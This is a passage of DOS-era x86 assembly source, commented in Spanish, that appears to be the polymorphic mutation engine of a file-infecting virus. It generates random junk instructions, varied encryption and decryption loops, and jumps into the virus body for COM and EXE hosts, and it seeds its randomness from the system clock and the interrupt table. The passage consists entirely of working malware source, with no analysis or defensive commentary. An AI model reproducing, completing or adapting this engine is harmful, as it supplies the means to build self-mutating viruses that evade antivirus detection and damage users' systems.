           JZ  HazBasuraAleatoria2
           CMP AL, [RegistroContador-200h]
           JZ  HazBasuraAleatoria2
           MOV CL, AL
           CALL    Aleatorio
           AND AL, 03
           JZ    @@SaltoAleatorio
           TEST    AH, 0C0h
           JZ    @@Salxto00
           PUSH    AX
           MOV AL, 66h
           STOSB
           POP AX
      @@Salxto00:  CMP AL, 02
           JB    @@Instruccion1byte
           JZ    @@Instruccion2bytes
   @@Instruccion3bytes:
           CALL    Siono
           JZ    @@KKDLL1
           CALL    Siono
           JZ    @@KKDLL1
           CALL    Siono
           JZ    @@KKDLL1
           JMP MeteEscritura
       @@KKDLL1:   CALL    Aleatorio
           TEST    AH, 03h
           JZ    @@InstruccionChunga
           TEST    AH, 0E0h
           JZ    @@OtroTipo
           MOV CH, AH
           AND AX, 007Fh
           MOV BL, 0Ah
           DIV BL
           MOV AL, AH
           AND CH, 04h
           ADD CL, CH
           MOV BX, Offset BasuraInstruc - 200h
           XLAT
           MOV BL, AL
           CMP BL, 3Ah
           JNZ   @@Salllclx
           CALL    Aleatorio
           AND AL, 02
           ADD AL, 38h
     @@Salllclx:   AND AH, 07h
           ROL CL, 3
           OR  AH, CL
           CALL    SioNo
           JNZ   @@SaltoCXC
           OR  AH, 80h
           JMP   @@SaltoCXC2
       @@SaltoCXC: OR  AH, 40h
      @@SaltoCXC2: MOV AL, BL
           STOSW
           TEST    AH, 80h
           PUSHF
           CALL    Aleatorio
           POPF
           JZ    @@Bytett
           STOSW
           RET
      @@Bytett:    STOSB
           RET
   @@InstruccionChunga:
           MOV AL, 0Fh
           STOSB
           AND AH, 04h
           ADD CL, AH
           CALL    Aleatorio
           OR  AH, 0C0h
           AND AH, 0F8h
           ADD AH, CL
           AND AL, 0Fh
           ADD AL, 90h
           STOSW
           RET
   @@OtroTipo: CMP BYTE PTR [DI-01], 66h
           JNZ   @@CJJJDC
           DEC DI
     @@CJJJDC: MOV BL, AH
           AND AH, 04
           ADD CL, AH
           AND BL, 08h
           ROR BL, 2
           MOV AL, 80h
           ADD AL, BL
           STOSB
           CALL    Aleatorio
           OR  AL, 0C0h
           AND AL, 0F8h
           OR  AL, CL
           STOSW
           RET

   @@Instruccion2bytes:
           CALL    Siono
           JZ    @@KKDLL2
           CALL    Siono
           JZ    @@KKDLL2
           CALL    Siono
           JZ    @@KKDLL2
           JMP MeteEscritura
      @@KKDLL2:    TEST    AH, 07h
           JZ    @@HazInt
           CALL    Aleatorio
           OR  CL, CL
           JNZ   @@Salxto02
           TEST    AL, 0C0h
           JZ    @@InstrucConAX
      @@Salxto02:  MOV BL, AL
           AND AL, 38h
           CMP AL, 38h
           JNZ   @@CDVDC
           CALL    Aleatorio
           AND AL, 02h
           ADD AL, 38h
           JMP   @@CDVDC2
        @@CDVDC:   ADD AL, 02
        @@CDVDC2:  AND AH, 07h
           XOR DL, DL
           TEST    BL, 01
           JZ    @@Salxto03
           OR  AH, 0C0h
           MOV DX, AX
           CALL    Aleatorio
           XCHG    DX, AX
           AND DL, 01
           ADD AL, DL
           XOR DX, DX
           JMP   @@Salxto08
      @@Salxto03:  CMP AH, 06h
           JNZ   @@Salxto04
           MOV DL, 01
      @@Salxto04:  AND BL, 04
           ADD CL, BL
      @@Salxto08:  ROL CL, 3
           OR  AH, CL
           OR  DL, DL
           JZ    @@Salxto05
           STOSW
           CALL    Aleatorio
      @@Salxto05:  STOSW
           RET
   @@InstrucConAX: CALL    SioNo
           JZ    @@KK01
           AND AL, 01h
           ADD AL, 0D4h
           STOSW
           RET
          @@KK01:  AND AL, 38h
           ADD AL, 04h
           STOSW
           RET
   @@HazInt:   CALL    Aleatorio
           MOV BX, Offset OpcodesInterrup - 200h
           AND AL, 03h
           XLAT
           CMP BYTE PTR [DI-01], 66h
           JNZ   @@Salxto06
           DEC DI
     @@Salxto06:   MOV AH, AL
           MOV AL, 0CDh
           STOSW
           RET

   @@Instruccion1byte:
           CMP BYTE PTR [DI-01], 66h
           JNZ   @@DHHDS
           DEC DI
          @@DHHDS: CALL    Aleatorio
           TEST    AL, 0C0h
           JZ    @@INCDEC
   @@DeTodo:   MOV BH, 08h
           OR  CL, CL
           JNZ   @@Salxto01
           ADD BH, 08h
      @@Salxto01:  AND AX, 007Fh
           DIV BH
           MOV AL, AH
           MOV BX, Offset BasuraNoBanderas - 200h
           XLAT
           STOSB
           RET
   @@INCDEC:   AND AL, 08h
           ADD AL, CL
           ADD AL, 40h
           STOSB
       @@Salir:    RET
   @@SaltoAleatorio:
           CMP BYTE PTR [PrimerByte-200h], 0
           JZ    @@Salir
           CMP BYTE PTR [EstoyDentro-200h], 01
           JZ    @@Salir
           MOV BYTE PTR [EstoyDentro-200h], 01
           CALL    Aleatorio
           AND AL, 02
           ADD AL, 0E9h
           STOSB
           CALL    SioNo
           JZ    @@CallAleatorio
           MOV BL, AL
        @@KKKKSK:  CALL    Aleatorio
           AND AX, 0007h
           JZ    @@KKKKSK
           CMP BL, 0E9h
           JZ    @@Salhhh
           STOSB
           JMP   @@Saliii
         @@Salhhh: STOSW
         @@Saliii: MOV CX, AX
         @@Saljjj: CALL    Aleatorio
           STOSB
           LOOP  @@Saljjj
           RET
   @@CallAleatorio:
           CMP BYTE PTR [NumeroCALLs-200h], 0
           JZ    @@MMDKKC
           CALL    MiraSiPrimerDes
           JZ    @@SaltaSigue
           CMP BYTE PTR [LoopYaEsta-200h], 1
           JNZ   @@MMDKKC
     @@SaltaSigue: PUSH    AX
           CALL    Aleatorio
           AND AX, 0003h
           POP AX
           JNZ   @@MMDKKC
           DEC DI
           MOV AL, 0E8h
           STOSB
           LEA CX, [DI+02]
           PUSH    BX
     @@MMDKKC2:    CALL    Aleatorio
           AND AX, 0007h
           CMP AL, [NumeroCALLs-200h]
           JAE   @@MMDKKC2
           ROL AX, 1
           MOV BX, AX
           ADD BX, Offset DirecCALLs-200h
           MOV AX, [BX]
           SUB AX, CX
           STOSW
           POP BX
           RET

     @@MMDKKC: PUSH    DI
           TEST    AL, 02h
           PUSHF
           XOR AL, AL
           POPF
           JNZ   @@Salccc
           STOSB
        @@Salccc:  STOSB
           CMP BYTE PTR [NumeroCALLs-200h], 08h
           JZ    @@OtraVez32
           INC BYTE PTR [NumeroCALLs-200h]
           PUSH    BX
           XOR BH, BH
           MOV BL, BYTE PTR [NumeroCALLs-200h]
           DEC BX
           ROL BX, 1
           ADD BX, Offset DirecCALLs-200h
           MOV [BX], DI
           POP BX
      @@OtraVez32: CALL    Aleatorio
           AND AX, 0003
           JZ    @@OtraVez32
        @@Loopccc: PUSH    AX
           CALL    HazBasuraAleatoria2
           POP AX
           DEC AX
           JNZ   @@Loopccc
        @@Salddd:  MOV AL, 0C3h
           STOSB
           POP SI
           LEA AX, [SI+02]
           CMP BYTE PTR [SI-01], 0E9h
           PUSHF
           JZ    @@Saleee
           DEC AX
        @@Saleee:  MOV CX, DI
           SUB CX, AX
           POPF
           JZ    @@Salfff
           MOV [SI], CL
           JMP   @@Salggg
        @@Salfff:  MOV [SI], CX
           INC SI
        @@Salggg:  INC SI
           MOV AL, 0E8h
           STOSB
           MOV AX, SI
           SUB AX, DI
           DEC AX
           DEC AX
           STOSW
           RET
   HazBasuraAleatoria2 ENDP

   PonInt      PROC
           CALL    Aleatorio
           TEST    AH, 0C0h
           JNZ   @@Salir
           MOV SI, Offset FuncInterrup - 200h
           AND AX, 0018h
           JZ    @@Pollas
           ADD SI, AX
           MOV AH, [SI]
        @@KKAS:    MOV AL, 0B4h
           STOSW
           MOV AL, 0CDh
           MOV AH, [SI+01]
           STOSW
      @@Salir: RET
      @@Pollas:    CALL    Aleatorio
           JMP   @@KKAS
   PonInt      ENDP

   PonContador PROC
           MOV CX, [TamanyoContador-200h]
           MOV DL, [RegistroContador-200h]
           TEST    BP, 0080h
           JNZ   @@ByteCont
           SHR CX, 1
   @@ByteCont: TEST    BP, 0001h
           JZ    @@RestaCont
           NEG CX
   @@RestaCont:    CALL    PonInstrucMOV
           RET
   PonContador ENDP

   PonIndice   PROC
           MOV CX, [InicioVirus-200h+1]
           MOV DL, [RegistroIndice-200h]
           TEST    BP, 0002
           JZ    @@Salto
           CALL    Aleatorio
           SUB CX, AX
           MOV [SumaIndice-200h], AX
           JMP   @@Salto2
      @@Salto: MOV WORD PTR [SumaIndice-200h], 0
      @@Salto2:    CALL    PonInstrucMOV
           RET
   PonIndice   ENDP

   PonEncriptador  PROC
           TEST    BP, 0100h
           JZ    @@Salto1
      @@OtraVez:   CALL    Aleatorio
           OR  AL, AL
           JZ    @@OtraVez
           OR  AH, AH
           JZ    @@OtraVez
           MOV CX, AX
           MOV DL, [RegistroEncriptado-200h]
           MOV [WordEncriptado-200h], AX
           CALL    PonInstrucMOV
           RET
        @@Salto:   CALL    HazBasuraAleatoria
           RET
        @@Salto1:  CALL    Aleatorio
           CALL    PonStack
           MOV [WordEncriptado-200h], AX
           RET
   PonEncriptador  ENDP

   PonInstrucMOV   PROC
           CALL    HazBasuraAleatoria
           CALL    PonStack
        @@Saslld:  CALL    Aleatorio
           AND AL, 03
           JZ    @@Saslld
           DEC AL
           OR  AL, AL
           JZ    @@PonLea
           CMP AL, 01
           JZ    @@PonMOV
      @@PonPUSH:   MOV AL, 68h
           STOSB
           MOV AX, CX
           STOSW
           CALL    HazBasuraAleatoria
           CALL    SioNo
           JZ    @@Saslld2
           MOV AH, DL
           OR  AH, 0C0h
           MOV AL, 8Fh
           STOSW
           RET
        @@Saslld2: MOV AL, DL
           OR  AL, 58h
           STOSB
           RET
      @@PonMOV:    CALL    SioNo
           JZ    @@PonMOV2
           MOV AL, DL
           OR  AL, 0B8h
           STOSB
           JMP   @@Salto
      @@PonMOV2:   MOV AL, 0C7h
           MOV AH, 0C0h
           OR  AH, DL
           STOSW
      @@Salto: MOV AX, CX
           STOSW
           RET
      @@PonLEA:    ROL DL, 3
           OR  DL, 6
           MOV AL, 8Dh
           MOV AH, DL
           STOSW
           JMP   @@Salto
   PonInstrucMOV   ENDP

   SioNo       PROC
           PUSH    AX
           CALL    Aleatorio
           AND AL, 01
           POP AX
           RET
   SioNo       ENDP

   HazEncriptador  PROC
           MOV AX, BP
           AND AL, 18h
           ROR AL, 3
           MOV BX, Offset OpcodesCriptado - 200h
           XLAT
           TEST    BP, 0100h
           JZ    @@NoEncripREG
   @@EncripREG:    MOV DL, [RegistroEncriptado-200h]
           TEST    BP, 0080h
           JZ    @@Salto001
           CMP DL, 04
           JB    @@Salto002
           AND BP, 0FEFFh
           JMP   @@NoEncripREG
       @@Salto002: DEC AL
           TEST    BP, 0200h
           JZ    @@Salto001
           OR  DL, 04h
       @@Salto001: STOSB
           ROL DL, 3
           MOV BX, Offset TablaIndices - 200h
           MOV AL, [RegistroIndice-200h]
           XLAT
           OR  AL, DL
           TEST    BP, 0002
           JZ    @@Salto003
           AND AL, 3Fh
           OR  AL, 80h
           STOSB
           MOV AX, [SumaIndice-200h]
           STOSW
           RET
       @@Salto003: CMP BYTE PTR [RegistroIndice-200h], 05h
           JNZ   @@Salto004
           STOSB
           XOR AL, AL
       @@Salto004: STOSB
           RET

   @@NoEncripREG:  DEC AL
           MOV AH, AL
           MOV AL, 80h
           TEST    BP, 0080h
           JNZ   @@Salto010
           INC AL
      @@Salto010:  STOSB
           MOV BX, Offset TablaIndices - 200h
           MOV AL, [RegistroIndice-200h]
           XLAT
           OR  AL, AH
           TEST    BP, 0002
           JNZ   @@Salto011
           CMP BYTE PTR [RegistroIndice-200h], 05
           JZ    @@Salto012
           STOSB
           JMP   @@Sigue
       @@Salto012: STOSB
           XOR AL, AL
           STOSB
           JMP   @@Sigue
       @@Salto011: AND AL, 3Fh
           OR  AL, 80h
           STOSB
           MOV AX, [SumaIndice-200h]
           STOSW
       @@Sigue:    MOV AX, [WordEncriptado-200h]
           TEST    BP, 0080h
           JNZ   @@EncripByte
           STOSW
           RET
    @@EncripByte:  STOSB
           RET
   HazEncriptador  ENDP

   ModificaContador PROC
           MOV DL, [RegistroContador-200h]
           TEST    BP, 0001
           JZ    @@Resta
   @@Suma:     CALL    Aleatorio
           AND AL, 07h
           JZ  PonINCbyte
           CMP AL, 02
           JB  PonADDbyte
           JZ  PonADDSUBbyte
           CMP AL, 04
           JB  PonSUBADDbyte
           JZ  PonSUBbyte
           CMP AL, 06
           JB  PonNOTNEG
           JZ    @@PonSUBDECbyte
   @@PonDECADDbyte: CALL   PonDEC
           CALL    HazBasuraAleatoria
           MOV DH, 02
           CALL    PonADD
           RET
   @@PonADDDECbyte: MOV    DH, 02
           CALL    PonADD
           CALL    HazBasuraAleatoria
           CALL    PonDEC
           RET
   @@PonSUBDECbyte: MOV    DH, 0FEh
           CALL    PonSUB
           CALL    HazBasuraAleatoria
           CALL    PonDEC
           RET
   @@Resta:    CMP DL, 01
           JNZ   @@Siggig1
           TEST    BP, 6000h
           JZ    @@Siggig1
           RET
      @@Siggig1:   CALL    Aleatorio
           AND AL, 07
           JZ    @@PonDECbyte
           CMP AL, 02
           JB    @@PonADDbyte2
           JZ  PonSUBADDbyte2
           CMP AL, 04
           JB  PonADDSUBbyte2
           JZ  PonSUBbyte2
           CMP AL, 06
           JB    @@PonNEGNOT
           JZ    @@PonADDADD
   @@PonSUBSUB:    MOV AX, 0E881h
           OR  AH, DL
           STOSW
           XCHG    AX, CX
          @@KKEC:  CALL    Aleatorio
           OR  AX, AX
           JZ    @@KKEC
           STOSW
           CALL    HazBasuraAleatoria
           XCHG    AX, CX
           STOSW
           XCHG    AX, CX
           NEG AX
           INC AX
           STOSW
           RET
   @@PonADDADD:    MOV AX, 0C081h
           OR  AH, DL
           STOSW
           XCHG    AX, CX
        @@KKEC2:   CALL    Aleatorio
           OR  AX, AX
           JZ    @@KKEC2
           STOSW
           CALL    HazBasuraAleatoria
           XCHG    AX, CX
           STOSW
           XCHG    AX, CX
           NOT AX
           STOSW
           RET

   @@PonDECbyte:   CALL    PonDEC
           RET
   @@PonADDbyte2:  MOV DH, 0FFh
           CALL    PonADD
           RET
   PonSUBADDbyte2: CALL    Aleatorio
           AND AL, 7Fh
           CMP AL, 7Fh
           JZ  PonSUBADDbyte2
           MOV DH, AL
           CALL    PonSUB
           CALL    HazBasuraAleatoria
           DEC DH
           CALL    PonADD
           RET
   PonADDSUBbyte2: CALL    Aleatorio
           AND AL, 7Fh
           CMP AL, 7Fh
           JZ  PonADDSUBbyte2
           MOV DH, AL
           CALL    PonADD
           CALL    HazBasuraAleatoria
           INC DH
           CALL    PonSUB
           RET
     PonSUBbyte2:  MOV DH, 01
           CALL    PonSUB
           RET
   @@PonNEGNOT:    MOV AL, 0F7h
           MOV AH, DL
           OR  AH, 0D8h
           STOSW
           CALL    HazBasuraAleatoria
           AND AH, 0F7h
           STOSW
           RET

   IncrementaIndice PROC
           MOV DL, [RegistroIndice-200h]
           CMP DL, 07h
           JZ    @@Especial
       @@Normal:   TEST    BP, 0080h
           JZ    @@NormalWord
    @@NormalByte:  CALL    Aleatorio
           AND AL, 07h
           JZ  PonINCbyte
           CMP AL, 02
           JB  PonADDbyte
           JZ  PonADDSUBbyte
           CMP AL, 04
           JB  PonSUBbyte
           JZ  PonSUBADDbyte
           CMP AL, 06
           JB  PonNOTNEG
           JZ    @@PonLEAbyte
       PonINCbyte: CALL    PonINC
           RET
       PonADDbyte: MOV DH, 01
           CALL    PonADD
           RET
    PonADDSUBbyte: CALL    Aleatorio
           AND AL, 7Fh
           JZ  PonADDSUBbyte
           MOV DH, AL
           CALL    PonADD
           CALL    HazBasuraAleatoria
           SUB DH, 01
           CALL    PonSUB
           RET
     PonSUBbyte:   MOV DH, 0FFh
           CALL    PonSUB
           RET
    PonSUBADDbyte: CALL    Aleatorio
           AND AL, 7Fh
           CMP AL, 7Fh
           JZ  PonSUBADDbyte
           MOV DH, AL
           CALL    PonSUB
           CALL    HazBasuraAleatoria
           ADD DH, 01
           CALL    PonADD
           RET

     PonNOTNEG:    MOV AL, 0F7h
           MOV AH, DL
           OR  AH, 0D0h
           STOSW
           CALL    HazBasuraAleatoria
           OR  AH, 0D8h
           STOSW
           RET

   @@PonLEAbyte:   MOV DH, 01
           CALL    PonLEA
           RET

   @@NormalWord:   CALL    Aleatorio
           AND AL, 07h
           JZ    @@PonINCword
           CMP AL, 02
           JB    @@PonADDword
           JZ    @@PonADDSUBword
           CMP AL, 04
           JB    @@PonSUBword
           JZ    @@PonSUBADDword
           CMP AL, 06
           JB    @@PonADDINCword
           JZ    @@PonDECADDword
   @@PonLEAword:   MOV DH, 02
           CALL    PonLEA
           RET
   @@PonINCword:   CALL    PonINC
           JMP PonINCbyte
   @@PonADDword:   MOV DH, 02
           CALL    PonADD
           RET
   @@PonADDSUBword: CALL   Aleatorio
           AND AL, 7Fh
           CMP AL, 01
           JBE PonADDSUBbyte
           MOV DH, AL
           CALL    PonADD
           CALL    HazBasuraAleatoria
           SUB DH, 02
           CALL    PonSUB
           RET
   @@PonSUBword:   MOV DH, 0FEh
           CALL    PonSUB
           RET
   @@PonSUBADDword: CALL   Aleatorio
           AND AL, 7Fh
           CMP AL, 7Eh
           JAE PonSUBADDbyte
           MOV DH, AL
           CALL    PonSUB
           CALL    HazBasuraAleatoria
           ADD DH, 02
           CALL    PonADD
           RET
   @@PonADDINCword: MOV    DH, 01
           CALL    PonADD
           CALL    HazBasuraAleatoria
           CALL    PonINC
           RET
   @@PonDECADDword: CALL   PonDEC
           CALL    HazBasuraAleatoria
           MOV DH, 03
           CALL    PonADD
           RET

       @@Especial: CALL    SioNo
           JNZ   @@Normal
           TEST    BP, 0080h
           JZ    @@HazWORD
   @@HazByte:  CALL    Aleatorio
           AND AL, 03
           JZ    @@PonSCASB
           CMP AL, 02
           JB    @@PonDECSCASW
           JZ    @@PonSCASWDEC
   @@PonADDSCASB:  CALL    Aleatorio
           AND AL, 01
           ADD AL, 02
           MOV DH, AL
           CALL    PonADD
           MOV AH, DH
           ADD AH, 0ACh
           MOV AL, 0FDh
           STOSW
           RET
   @@PonSCASB: MOV AX, 0AEFCh
           STOSW
           RET
   @@PonDECSCASW:  CALL    PonDEC
           CALL    HazBasuraAleatoria
           MOV AX, 0AFFCh
           STOSW
           RET
   @@PonSCASWDEC:  MOV AX, 0AFFCh
           STOSW
           CALL    HazBasuraAleatoria
           CALL    PonDEC
           RET

   @@HazWord:  CALL    Aleatorio
           AND AL, 03
           JZ    @@PonSCASW
           CMP AL, 02
           JB    @@PonINCSCASB
           JZ    @@PonSCASBINC
   @@PonADDSCASB2: CALL    Aleatorio
           AND AL, 01
           MOV DH, AL
           CALL    PonADD
           CALL    HazBasuraAleatoria
           MOV AH, DH
           NEG AH
           ADD AH, 0AFh
           MOV AL, 0FCh
           STOSW
           RET
   @@PonINCSCASB:  CALL    PonINC
           CALL    HazBasuraAleatoria
           MOV AX, 0AEFCh
           STOSW
           RET
   @@PonSCASBINC:  MOV AX, 0AEFCh
           STOSW
           CALL    HazBasuraAleatoria
           CALL    PonINC
           RET
   @@PonSCASW: MOV AX, 0AFFCh
           STOSW
           RET
   IncrementaIndice ENDP
   ModificaContador ENDP

   ModificaRegistro PROC
           MOV DL, [RegistroEncriptado-200h]
           TEST    BP, 0100h
           JZ    @@Fin
           TEST    BP, 0004h
           JZ    @@Fin
           CALL    Aleatorio
           MOV [WordCambio-200h], AX
           TEST    BP, 0020h
           JZ    @@PonXORoSUB
     @@PonADDoROL: TEST    BP, 0040h
           JZ    @@PonADD
        @@PonROL:  MOV AX, 0C0D1h
           OR  AH, DL
           STOSW
       @@Fin:  RET
        @@PonADD:  MOV AX, 0C081h
           CALL    SioNo
           JZ    @@Pon2ADD
      @@Saltoop:   OR  AH, DL
           STOSW
           MOV AX, [WordCambio-200h]
           STOSW
           RET
      @@Pon2ADD:
      @@Saltooo:   OR  AH, DL
           STOSW
           PUSH    AX
           CALL    Aleatorio
           MOV CX, AX
           MOV AX, [WordCambio-200h]
           SUB AX, CX
           STOSW
           CALL    HazBasuraAleatoria
           POP AX
           STOSW
           MOV AX, CX
           STOSW
           RET
    @@PonXORoSUB:  TEST    BP, 0040h
           JZ    @@PonXOR
        @@PonSUB:  MOV AX, 0E881h
           CALL    SioNo
           JZ    @@Saltooo
           JMP   @@Saltoop
      @@PonXOR:    MOV AX, 0F081h
           JMP   @@Saltoop
   ModificaRegistro ENDP

   PonLEA      PROC
           MOV AL, 8Dh
           STOSB
           MOV AL, DL
           MOV BX, Offset TablaIndices - 200h
           XLAT
           AND AL, 07h
           ROL DL, 3
           OR  AL, DL
           CALL    SioNo
           JZ    @@Salto02
           OR  AL, 40h
           STOSB
           MOV AL, DH
           STOSB
           RET
    @@Salto02: OR  AL, 80h
           STOSB
           MOV AL, DH
           CBW
           STOSW
           RET
   PonLEA      ENDP

   PonDEC      PROC
           PUSH    CX
           MOV CL, 08h
           JMP Sigue
   PonINC      PROC
           PUSH    CX
           XOR CL, CL
        Sigue: CALL    SioNo
           JZ    @@Salto01
           MOV AL, 0FFh
           MOV AH, DL
           OR  AH, 0C0h
           OR  AH, CL
           STOSW
           POP CX
           RET
        @@Salto01: MOV AL, DL
           OR  AL, 40h
           OR  AL, CL
           STOSB
           POP CX
           RET
   PonINC      ENDP
   PonDEC      ENDP

   PonADD      PROC
           MOV AL, 81h
           STOSB
           MOV AL, 0C0h
           OR  AL, DL
           STOSB
           MOV AL, DH
           CBW
           CALL    SioNo
           JZ    @@Salto001
           MOV BYTE PTR [DI-02], 83h
           STOSB
           RET
      @@Salto001:  STOSW
           RET
   PonADD      ENDP

   PonSUB      PROC
           MOV AL, 81h
           STOSB
           MOV AL, 0E8h
           OR  AL, DL
           STOSB
           MOV AL, DH
           CBW
           CALL    SioNo
           JZ    @@Salto001
           MOV BYTE PTR [DI-02], 83h
           STOSB
           RET
      @@Salto001:  STOSW
           RET
   PonSUB      ENDP

   MeteComprueba   PROC
           MOV DL, [RegistroContador-200h]
           CMP DL, 01
           JNZ   @@Gimma
           TEST    BP, 0001h
           JNZ   @@Gimma
           TEST    BP, 6000h
           JNZ   @@MeteParaLOOP
       @@Gimma:    CALL    Aleatorio
           AND AL, 01
           JZ    @@FuncionLogica
   @@Operacion:    MOV BX, Offset OpcodesComprueba - 200h
           MOV AL, AH
           AND AL, 03
           XLAT
           MOV AH, AL
           OR  AH, DL
           MOV AL, 81h
           MOV CX, AX
           CALL    Aleatorio
           AND AL, 02
           XCHG    CX, AX
           OR  AL, CL
           STOSW
           XOR AX, AX
           CMP CL, 02
           JZ    @@Inserta1
    @@Inserta2:    STOSW
           RET
    @@Inserta1:    STOSB
           RET
   @@FuncionLogica: CALL   Aleatorio
           AND AL, 03
           JZ    @@FuncionLogica
           DEC AL
           MOV BX, Offset OpcodesLogicos - 200h
           XLAT
           CMP AL, 85h
           JZ    @@Salta
           AND AH, 02
           ADD AL, AH
      @@Salta: MOV AH, DL
           ROL AH, 3
           OR  AH, DL
           OR  AH, 0C0h
           STOSW
           RET
   @@MeteParaLOOP: MOV AX, BP
           AND AX, 6000h
           CMP AH, 40h
           JZ    @@PonLOOPZ
           JB    @@PonLOOPNZ
           RET
    @@PonLOOPZ:    CALL    Aleatorio
           AND AL, 03
           ADD AL, 39h
           AND AH, 07h
           MOV CL, AH
           ROL CL, 3
           OR  AH, CL
           OR  AH, 0C0h
           STOSW
           RET
    @@PonLOOPNZ:   CALL    Aleatorio
           AND AL, 02h
           ADD AL, 81h
           MOV AH, 0F9h
           STOSW
           TEST    AL, 02h
           PUSHF
           XOR AL, AL
           POPF
           JNZ   @@Mete1byte
           STOSB
     @@Mete1byte:  STOSB
           RET
   MeteComprueba   ENDP

   HazBasuraSinBanderas PROC
           CALL    Aleatorio
           AND AX, 0003
           JZ    @@Fin
           MOV CX, AX
          @@Loop:  MOV BX, Offset BasuraNoBanderas - 200h
           CALL    Aleatorio
           AND AL, 07h
           XLAT
           STOSB
           LOOP  @@Loop
       @@Fin:  RET
   HazBasuraSinBanderas ENDP

   MeteSaltoLoop   PROC
           CMP BYTE PTR [RegistroContador-200h], 01
           JNZ   @@Bigibiggs
           TEST    BP, 0001h
           JNZ   @@Bigibiggs
           TEST    BP, 6000h
           JNZ   @@Especial
     @@Bigibiggs:  MOV AX, BP
           AND AX, 1
           ROL AX, 2
           MOV BX, Offset Saltos - 200h
           ADD BX, AX
           CALL    Aleatorio
           AND AL, 03
           XLAT
           AND AH, 01
           JZ    @@Salto16bits
   @@Salto8bits:   MOV CX, [InicLoop-200h]
           SUB CX, DI
           DEC CX
           DEC CX
           MOV AH, CL
           STOSW
           RET
   @@Salto16bits:  ADD AL, 10h
           MOV AH, AL
           MOV AL, 0Fh
           STOSW
           MOV AX, [InicLoop-200h]
           SUB AX, DI
           SUB AX, 0002
           STOSW
           RET
    @@Especial:    MOV AX, BP
           AND AX, 6000h
           ROL AX, 3
           ADD AL, 0DFh
           STOSB
           MOV AX, [InicLoop-200h]
           SUB AX, DI
           DEC AX
           STOSB
           RET
   MeteSaltoLoop   ENDP

   InicAleatorio   PROC
           MOV AH, 1Ah
           CALL    Int21h
           AND DX, 0FFFCh
           XOR DX, CX
           PUSH    ES
           XOR AX, AX
           MOV ES, AX
           MOV CX, ES:[0074h]
       @@Cosa: XOR DX, CX
           ADD CX, DX
           MOV AX, ES:[0040h]
           XOR AX, CX
           MOV [WordAleatorio1-200h], DX
           MOV [WordAleatorio2-200h], CX
           MOV [WordAleatorio3-200h], AX
           POP ES
           RET
   InicAleatorio   ENDP

   WordAleatorio1  DW  1234h
   WordAleatorio2  DW  5678h
   WordAleatorio3  DW  9ABCh

   Aleatorio   PROC
           PUSH    CX
           MOV AX, [WordAleatorio1-200h]
           DEC WORD PTR [WordAleatorio1-200h]
           XOR AX, [WordAleatorio2-200h]
           MOV CX, AX
           ROL WORD PTR [WordAleatorio1-200h], CL
           ADD [WordAleatorio1-200h], AX
           ADC AX, [WordAleatorio2-200h]
           ADD AX, CX
           ROR AX, CL
           NOT AX
           SUB AX, 0003
           XOR [WordAleatorio2-200h], AX
           XOR AX, [WordAleatorio3-200h]
           ROL WORD PTR [WordAleatorio3-200h], 1
           SUB WORD PTR [WordAleatorio3-200h], CX
           SBB WORD PTR [WordAleatorio3-200h], 4
           INC WORD PTR [WordAleatorio2-200h]
           POP CX
           RET
   Aleatorio   ENDP

   SaltoInicio PROC
           MOV AX, BP
           AND AX, 0C00h
           ROL AX, 6
           CMP AL, 01
           JB    @@PonJMP
           JZ    @@PonRET
           CMP AL, 03
           JB    @@PonRETF
      @@PonIRET:   CALL    Aleatorio
           AND AL, 03
           JZ    @@PonIRET
           CMP AL, 02
           JB    @@PonRET0004
           JZ    @@PonRETF0002
           MOV AL, 0CFh
           JMP   @@Fin1
     @@PonRET0004: MOV AX, 04C2h
        @@Salto1:  STOSW
           XOR AL, AL
           JMP   @@Fin1
    @@PonRETF0002: MOV AX, 02CAh
           JMP   @@Salto1
       @@PonRETF:  CALL    SioNo
           JZ    @@PonRET0002
           MOV AL, 0CBh
           JMP   @@Fin1
    @@PonRET0002:  MOV AX, 02C2h
           JMP   @@Salto1
       @@PonRET:   MOV AL, 0C3h
           JMP   @@Fin1
      @@PonJMP:    MOV AL, 0E9h
           STOSB
           MOV AX, Offset NewVirus-200h
           SUB AX, DI
           DEC AX
           DEC AX
           CALL    MiraSiPrimerDes
           JZ    @@Salto
           ADD AX, LongVirus
       @@Salto:    STOSW
           RET
         @@Fin1:   STOSB
           RET
   SaltoInicio ENDP

   PonStack    PROC
           PUSH    AX
           CMP BYTE PTR [Estado-200h], 0
           JZ    @@Fin
           CALL    HazBasuraAleatoria
           CMP BYTE PTR [Estado-200h], 2
           JB    @@PonIP
           JZ    @@PonCS
       @@PonFLAGS: MOV AL, 9Ch
           JMP   @@Sigue
       @@PonCS:    CMP BYTE PTR [TipoEjec-200h], 0
           JZ    @@Salto
           MOV AL, 0Eh
           JMP   @@Sigue
       @@Salto:    CALL    Aleatorio
           AND AL, 18h
           CMP AL, 18h
           JZ    @@Salto
           ADD AL, 06h
           JMP   @@Sigue
       @@PonIP:    MOV AL, 68h
           STOSB
           MOV AX, [InicioVirus-200h+1]
           CALL    MiraSiPrimerDes
           JZ    @@SKKKKJ
           ADD AX, LongVirus
     @@SKKKKJ: STOSW
           JMP   @@Fin1
         @@Sigue:  STOSB
          @@Fin1:  DEC BYTE PTR [Estado-200h]
       @@Fin:  POP AX
           RET
   PonStack    ENDP

   MiraSiPrimerDes PROC
           CMP WORD PTR [LongDesencrip-200h], 0
           RET
   MiraSiPrimerDes ENDP

   MeteEscritura   PROC
           CMP BYTE PTR [DI-01], 66h
           JNZ   @@Sigue6
           DEC DI
     @@Sigue6: CMP BYTE PTR [TipoEjec-200h], 1
           JZ    @@EsEXE
     @@EsCOM:  CALL    Aleatorio
           AND AL, 18h
           ADD AL, 26h
           JMP   @@Sigue1
     @@EsEXE:  MOV AL, 2Eh
     @@Sigue1: STOSB
     @@Sigue2: CALL    Aleatorio
           AND AL, 39h
           AND AH, 38h
           ADD AH, 06h
           STOSW
     @@Sigue3: CALL    Aleatorio
           AND AX, 001Fh
           CMP AX, 0016h
           JAE   @@Sigue3
           MOV BX, 0003
           MUL BX
           MOV BX, AX
           ADD BX, Offset Escritura-200h
           MOV CL, [BX]
           INC CL
           XOR DX, DX
           CALL    Aleatorio
           XOR CH, CH
           DIV CX
           MOV AX, DX
           ADD AX, [BX+01]
      @@Sigue5:    ADD AX, [InicioVirus-200h+1]
           STOSW
           RET
   MeteEscritura   ENDP

   TablaIndices    DB  0, 0, 0, 7, 0, 46h, 4, 5
   OpcodesCriptado DB  31h, 01h, 29h, 31h
   OpcodesComprueba DB 0C0h, 0E8h, 0F8h, 0F8h
   OpcodesLogicos  DB  09h, 21h, 85h
